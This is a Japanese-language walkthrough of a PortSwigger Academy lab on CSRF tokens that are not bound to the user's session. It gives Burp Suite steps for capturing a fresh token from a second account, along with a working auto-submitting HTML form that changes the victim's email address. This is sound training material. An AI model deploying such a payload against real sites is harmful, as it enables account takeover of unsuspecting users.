# トークンがユーザーセッションに関連付けられていない CSRF

次のハッキングラボを実施します  
https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session  
このラボの電子メール変更機能は CSRF に対して脆弱です。トークンを使用して CSRF 攻撃を防止しようとしますが、トークンはサイトのセッション処理システムには統合されていません。

- 1. BurpSuite を起動して、Proxy タブからブラウザを立ち上げます
- 2. ハッキングラボにアクセスします
- 3. 一般ユーザーでログインして、メールアドレスを更新します
- 4. POST /my-account/change-email HTTP/2 リクエストを send to repeater します
- 5. シークレットブラウザを開き、ハッキングラボにアクセスします
- 6. 手順 3 とは異なる一般ユーザーでログインします
- 7. BurpSuite の intercept を on にして、シークレットブラウザでメールアドレスをキャッチして、csrf をメモして、リクエストをドロップします
- 8. エクスプロイトサーバに移動し、次の内容を入力します

```html
<body>
  <form method="POST" action="https://0a7a0017045976ba802d62a500020032.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="test3@com" />
    <input type="hidden" name="csrf" value="メモしたcsrf" />
    <input type="submit" value="submit" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
```

- 9. Store ボタン押下後に deliver exploit to victim ボタン押下
